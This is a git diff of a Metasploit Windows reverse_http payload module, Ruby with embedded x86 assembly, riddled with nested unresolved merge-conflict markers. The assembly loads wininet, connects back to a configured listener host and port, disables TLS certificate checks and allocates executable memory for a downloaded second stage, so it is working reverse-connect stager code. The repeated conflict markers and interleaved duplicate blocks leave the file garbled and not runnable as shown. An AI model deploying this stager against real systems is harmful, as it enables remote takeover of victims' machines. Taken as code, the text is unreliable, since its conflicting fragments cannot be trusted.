@@ -16,6 +16,7 @@ require 'msf/core'
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 =======
 >>>>>>> 4.11.2_release_pre-rails4
@@ -46,12 +47,15 @@ require 'msf/core'
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
 
 module Msf
 
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 =======
@@ -187,11 +191,16 @@ module Msf
 =======
 >>>>>>> rapid7/master
 =======
+=======
+=======
+=======
+>>>>>>> origin/msf-complex-payloads
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
 =======
@@ -205,6 +214,10 @@ module Msf
 =======
 >>>>>>> master
 >>>>>>> payload-generator.rb
+=======
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
 require 'msf/core/payload/transport_config'
 require 'msf/core/payload/windows/block_api'
 require 'msf/core/payload/windows/exitfunk'
@@ -212,7 +225,11 @@ require 'msf/core/payload/uuid/options'
 
 module Msf
 
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-windows.rb
+<<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -254,11 +271,18 @@ module Msf
 =======
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> origin/msf-complex-payloads
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
 =======
@@ -313,12 +337,15 @@ module Msf
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
 ###
 #
 # Complex payload generation for Windows ARCH_X86 that speak HTTP(S)
 #
 ###
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -510,11 +537,29 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
 
 module Payload::Windows::ReverseHttp
+>>>>>>> origin/msf-complex-payloads
 
   include Msf::Payload::Windows::BlockApi
   include Msf::Payload::Windows::Exitfunk
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+module Payload::Windows::ReverseHttp
+
+  include Msf::Payload::TransportConfig
+  include Msf::Payload::Windows
+  include Msf::Payload::Windows::BlockApi
+  include Msf::Payload::Windows::Exitfunk
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -620,12 +665,29 @@ module Msf
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+  include Msf::Payload::UUID::Options
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
 
   #
   # Register reverse_http specific options
   #
   def initialize(*args)
     super
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -919,12 +981,48 @@ module Msf
       [
         OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
 >>>>>>> rapid7/feature/complex-payloads
+=======
+    register_advanced_options(
+      [
+        OptInt.new('HTTPStagerURILength', [false, 'The URI length for the stager (5 to 240ish bytes)'])
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+    register_advanced_options([
+        OptInt.new('StagerURILength', [false, 'The URI length for the stager (at least 5 bytes)']),
+        OptInt.new('StagerRetryCount', [false, 'The number of times the stager should retry if the first connect fails', 10]),
+        OptString.new('PayloadProxyHost', [false, 'An optional proxy server IP address or hostname']),
+        OptPort.new('PayloadProxyPort', [false, 'An optional proxy server port']),
+        OptString.new('PayloadProxyUser', [false, 'An optional proxy server username']),
+        OptString.new('PayloadProxyPass', [false, 'An optional proxy server password']),
+        OptEnum.new('PayloadProxyType', [false, 'The type of HTTP proxy (HTTP or SOCKS)', 'HTTP', ['HTTP', 'SOCKS']])
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
       ], self.class)
   end
 
   #
   # Generate the first stage
   #
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1222,6 +1320,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
   def generate
     # Generate the simple version of this stager if we don't have enough space
     if self.available_space.nil? || required_space > self.available_space
@@ -1246,6 +1346,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
 =======
@@ -1254,15 +1355,21 @@ module Payload::Windows::ReverseHttp
 =======
 =======
 =======
+>>>>>>> origin/msf-complex-payloads
+=======
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 >>>>>>> payload-generator.rb
 =======
+>>>>>>> origin/msf-complex-payloads
+=======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
 =======
@@ -1317,6 +1424,10 @@ module Payload::Windows::ReverseHttp
   def generate(opts={})
     conf = {
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+  def generate(opts={})
+    conf = {
+>>>>>>> origin/msf-complex-payloads
       ssl:         opts[:ssl] || false,
       host:        datastore['LHOST'],
       port:        datastore['LPORT'],
@@ -1338,6 +1449,7 @@ module Payload::Windows::ReverseHttp
       conf[:url]        = generate_small_uri
     end
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1418,11 +1530,14 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> rapid7/master
 =======
+=======
+>>>>>>> origin/msf-complex-payloads
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -1451,6 +1566,12 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
     generate_reverse_http(conf)
   end
 
@@ -1478,6 +1599,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1537,11 +1659,14 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-windows.rb
 <<<<<<< HEAD
+=======
+>>>>>>> origin/msf-complex-payloads
   # TODO: Use the CachedSize instead (PR #4894)
   def cached_size
     321
 =======
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 =======
@@ -1642,11 +1767,21 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
   #
   # Generate the transport-specific configuration
   #
   def transport_config(opts={})
     transport_config_reverse_http(opts)
+<<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> origin/pod/metasploit-gemfile-
 <<<<<<< HEAD
@@ -1672,6 +1807,8 @@ module Payload::Windows::ReverseHttp
 =======
 >>>>>>> payload-generator.rb
 >>>>>>> origin/pod/metasploit-windows.rb
+=======
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -1684,6 +1821,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 =======
 >>>>>>> rapid7/master
@@ -8116,6 +8254,21 @@ module Payload::Windows::ReverseHttp
         0x00800000 | # INTERNET_FLAG_SECURE
         0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
         0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+=======
+  end
+
+  #
+  # Generate the URI for the initial stager
+  #
+  def generate_uri
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+    # Maximum URL is limited to https:// plus 256 bytes, figure out our maximum URI
+    uri_max_len = 256 - "#{datastore['LHOST']}:#{datastore['LPORT']}/".length
+>>>>>>> origin/msf-complex-payloads
 
       secure_flags = (
         0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
@@ -8242,6 +8395,7 @@ module Payload::Windows::ReverseHttp
       ^
     end
 
+<<<<<<< HEAD
     asm << %Q^
 <<<<<<< HEAD
     allocate_memory:
@@ -8264,6 +8418,52 @@ module Payload::Windows::ReverseHttp
 >>>>>>> pod/complex-payloads
 =======
 =======
+=======
+    # Generate a random 30+ byte URI
+    "/" + generate_uri_checksum(Msf::Handler::ReverseHttp::URI_CHECKSUM_INITW, 30 + rand(uri_max_len-30))
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+
+    uri_req_len = datastore['StagerURILength'].to_i
+
+    # Choose a random URI length between 30 and 255 bytes
+    if uri_req_len == 0
+      uri_req_len = 30 + rand(256-30)
+    end
+
+    if uri_req_len < 5
+      raise ArgumentError, "Minimum StagerURILength is 5"
+    end
+
+    generate_uri_uuid_mode(:init_native, uri_req_len)
+  end
+
+  #
+  # Generate the URI for the initial stager
+  #
+  def generate_small_uri
+    generate_uri_uuid_mode(:init_native, 5)
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
   end
 
   #
@@ -8276,17 +8476,77 @@ module Payload::Windows::ReverseHttp
     # Add 100 bytes for the encoder to have some room
     space += 100
 
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
     # Add 251 bytes for large URI support (technically a little less, but lets go with it)
     space += 251
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
+=======
+    # Make room for the maximum possible URL length
+    space += 256
+>>>>>>> rapid7/master
 
     # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
     space += 31
 
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
+=======
+    # Proxy options?
+    space += 200
+
+>>>>>>> rapid7/master
     # The final estimated size
     space
   end
 
   #
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
   # Dynamic payload generation
   #
   def asm_reverse_http(opts={})
@@ -8320,10 +8580,100 @@ module Payload::Windows::ReverseHttp
       #;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT
       #;0x00000200   ; INTERNET_FLAG_NO_UI
       http_open_flags = ( 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 )
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+  # Generate an assembly stub with the configured feature set and options.
+  #
+  # @option opts [Bool] :ssl Whether or not to enable SSL
+  # @option opts [String] :url The URI to request during staging
+  # @option opts [String] :host The host to connect to
+  # @option opts [Fixnum] :port The port to connect to
+  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
+  # @option opts [String] :proxy_host The optional proxy server host to use
+  # @option opts [Fixnum] :proxy_port The optional proxy server port to use
+  # @option opts [String] :proxy_type The optional proxy server type, one of HTTP or SOCKS
+  # @option opts [String] :proxy_user The optional proxy server username
+  # @option opts [String] :proxy_pass The optional proxy server password
+  # @option opts [Fixnum] :retry_count The number of times to retry a failed request before giving up
+  #
+  def asm_reverse_http(opts={})
+
+    retry_count   = [opts[:retry_count].to_i, 1].max
+    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
+    proxy_info    = ""
+
+    if proxy_enabled
+      if opts[:proxy_type].to_s.downcase == "socks"
+        proxy_info << "socks="
+      else
+        proxy_info << "http://"
+      end
+
+      proxy_info << opts[:proxy_host].to_s
+      if opts[:proxy_port].to_i > 0
+        proxy_info << ":#{opts[:proxy_port]}"
+      end
+    end
+
+    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : opts[:proxy_user]
+    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : opts[:proxy_pass]
+
+    http_open_flags = 0
+    secure_flags = 0
+
+    if opts[:ssl]
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 | # INTERNET_FLAG_NO_UI
+        0x00800000 | # INTERNET_FLAG_SECURE
+        0x00002000 | # INTERNET_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 ) # INTERNET_FLAG_IGNORE_CERT_CN_INVALID
+
+      secure_flags = (
+        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
+        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
+        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
+        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
+    else
+      http_open_flags = (
+        0x80000000 | # INTERNET_FLAG_RELOAD
+        0x04000000 | # INTERNET_NO_CACHE_WRITE
+        0x00400000 | # INTERNET_FLAG_KEEP_CONNECTION
+        0x00200000 | # INTERNET_FLAG_NO_AUTO_REDIRECT
+        0x00000200 ) # INTERNET_FLAG_NO_UI
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
     end
 
     asm = %Q^
       ;-----------------------------------------------------------------------------;
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
       ; Author: HD Moore
       ; Compatible: Confirmed Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
       ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
@@ -8332,6 +8682,33 @@ module Payload::Windows::ReverseHttp
 
       ; Input: EBP must be the address of 'api_call'.
       ; Output: EDI will be the socket for the connection to the server
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+      ; Compatible: Confirmed Windows 8.1, Windows 7, Windows 2008 Server, Windows XP SP1, Windows SP3, Windows 2000
+      ; Known Bugs: Incompatible with Windows NT 4.0, buggy on Windows XP Embedded (SP1)
+      ;-----------------------------------------------------------------------------;
+
+      ; Input: EBP must be the address of 'api_call'.
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
@@ -8340,9 +8717,16 @@ module Payload::Windows::ReverseHttp
         push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
         call ebp               ; LoadLibraryA( "wininet" )
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
 
       set_retry:
         push.i8 8              ; retry 8 times should be enough
@@ -8369,6 +8753,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> feature/complex-payloads
 =======
 <<<<<<< HEAD
@@ -8385,13 +8770,17 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 >>>>>>> rapid7/master
 =======
->>>>>>> rapid7/master
+=======
+>>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -8415,10 +8804,61 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+        xor ebx, ebx           ; Set ebx to NULL to use in future arguments
+      ^
+
+    if proxy_enabled
+      asm << %Q^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+      call get_proxy_server
+        db "#{proxy_info}", 0x00
+      get_proxy_server:
+                               ; LPCTSTR lpszProxyName (via call)
+        push 3                 ; DWORD dwAccessType (INTERNET_OPEN_TYPE_PROXY = 3)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
+    else
+      asm << %Q^
+      internetopen:
+        push ebx               ; DWORD dwFlags
+        push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+        push ebx               ; LPCTSTR lpszProxyName (NULL)
+        push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
+        push ebx               ; LPCTSTR lpszAgent (NULL)
+        push 0xA779563A        ; hash( "wininet.dll", "InternetOpenA" )
+        call ebp
+      ^
+    end
+
+    asm << %Q^
+      internetconnect:
+        push ebx               ; DWORD_PTR dwContext (NULL)
+        push ebx               ; dwFlags
+        push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+<<<<<<< HEAD
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
         push ebx               ; password (NULL)
         push ebx               ; username (NULL)
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8653,6 +9093,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
       server_uri:              ;  server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
@@ -8662,6 +9104,7 @@ module Payload::Windows::ReverseHttp
 
       httpopenrequest:
                                ; dwContext (NULL) [8]
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> feature/complex-payloads
@@ -8705,6 +9148,65 @@ module Payload::Windows::ReverseHttp
 >>>>>>> master
 =======
 >>>>>>> payload-generator.rb
+=======
+=======
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+      server_uri:              ; server_host; server_uri is saved in EDI for later
+        db "#{opts[:url]}", 0x00
+      got_server_host:
+        push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
+        push 0xC69F8957        ; hash( "wininet.dll", "InternetConnectA" )
+        call ebp
+        mov esi, eax           ; Store hConnection in esi
+      ^
+
+    # Note: wine-1.6.2 does not support SSL w/proxy authentication properly, it
+    # doesn't set the Proxy-Authorization header on the CONNECT request.
+
+    if proxy_enabled && proxy_user
+      asm << %Q^
+        ; DWORD dwBufferLength (length of username)
+        push #{proxy_user.length}
+        call set_proxy_username
+      proxy_username:
+        db "#{proxy_user}",0x00
+      set_proxy_username:
+                             ; LPVOID lpBuffer (username from previous call)
+        push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
+    end
+
+    if proxy_enabled && proxy_pass
+      asm << %Q^
+        ; DWORD dwBufferLength (length of password)
+        push #{proxy_pass.length}
+        call set_proxy_password
+      proxy_password:
+        db "#{proxy_pass}",0x00
+      set_proxy_password:
+                             ; LPVOID lpBuffer (password from previous call)
+        push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+        push esi             ; hConnection
+        push 0x869E4675      ; hash( "wininet.dll", "InternetSetOptionA" )
+        call ebp
+      ^
+    end
+
+    asm << %Q^
+      httpopenrequest:
+        push ebx               ; dwContext (NULL)
+<<<<<<< HEAD
+>>>>>>> origin/msf-complex-payloads
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8717,6 +9219,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 >>>>>>> msf-complex-payloads
@@ -8744,12 +9247,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
         push edi               ; server URI
         push ebx               ; method
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8834,10 +9340,29 @@ module Payload::Windows::ReverseHttp
 =======
         push eax               ; hConnection
 >>>>>>> rapid7/feature/complex-payloads
+=======
+        push eax               ; hConnection
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+=======
+        push esi               ; hConnection
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
         push 0x3B2E55EB        ; hash( "wininet.dll", "HttpOpenRequestA" )
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
 
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -8907,6 +9432,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
       send_request:
       ^
 
@@ -8931,7 +9458,13 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> rapid7/master
+=======
+=======
+>>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> rapid7/master
 =======
@@ -8940,8 +9473,7 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
-=======
->>>>>>> rapid7/master
+<<<<<<< HEAD
 =======
 >>>>>>> master
 =======
@@ -8999,6 +9531,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 =======
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+>>>>>>> origin/msf-complex-payloads
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
@@ -9006,6 +9540,7 @@ module Payload::Windows::ReverseHttp
 
       send_request:
     ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9027,6 +9562,11 @@ module Payload::Windows::ReverseHttp
     if opts[:ssl]
       asm << %Q^
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
+=======
+
+    if opts[:ssl]
+      asm << %Q^
+>>>>>>> origin/msf-complex-payloads
       ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
       set_security_options:
         push 0x#{secure_flags.to_s(16)}
@@ -9038,6 +9578,7 @@ module Payload::Windows::ReverseHttp
         push 0x869E4675        ; hash( "wininet.dll", "InternetSetOptionA" )
         call ebp
       ^
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9128,6 +9669,17 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+>>>>>>> origin/msf-complex-payloads
     end
 
     asm << %Q^
@@ -9147,6 +9699,7 @@ module Payload::Windows::ReverseHttp
         jnz send_request
 
       ; if we didn't allocate before running out of retries, bail out
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9274,6 +9827,8 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/feature/complex-payloads
 =======
 >>>>>>> rapid7/feature/complex-payloads
+=======
+>>>>>>> origin/msf-complex-payloads
       ^
 
       if opts[:exitfunk]
@@ -9639,6 +10194,7 @@ module Payload::Windows::ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> rapid7/feature/complex-payloads
 =======
 >>>>>>> origin/feature/complex-payloads
@@ -9704,10 +10260,15 @@ module Payload::Windows::ReverseHttp
 >>>>>>> origin/pod/metasploit-windows.rb
 <<<<<<< HEAD
 <<<<<<< HEAD
+=======
+=======
+=======
+>>>>>>> origin/msf-complex-payloads
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
 =======
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -9727,6 +10288,75 @@ module Payload::Windows::ReverseHttp
 >>>>>>> rapid7/master
 =======
 >>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+=======
+>>>>>>> rapid7/master
+    ^
+
+    if opts[:exitfunk]
+      asm << %Q^
+    failure:
+      call exitfunk
+      ^
+    else
+      asm << %Q^
+    failure:
+      push 0x56A2B5F0        ; hardcoded to exitprocess for size
+      call ebp
+      ^
+    end
+
+    asm << %Q^
+    allocate_memory:
+      push 0x40              ; PAGE_EXECUTE_READWRITE
+      push 0x1000            ; MEM_COMMIT
+      push 0x00400000        ; Stage allocation (4Mb ought to do us)
+      push ebx               ; NULL as we dont care where the allocation is
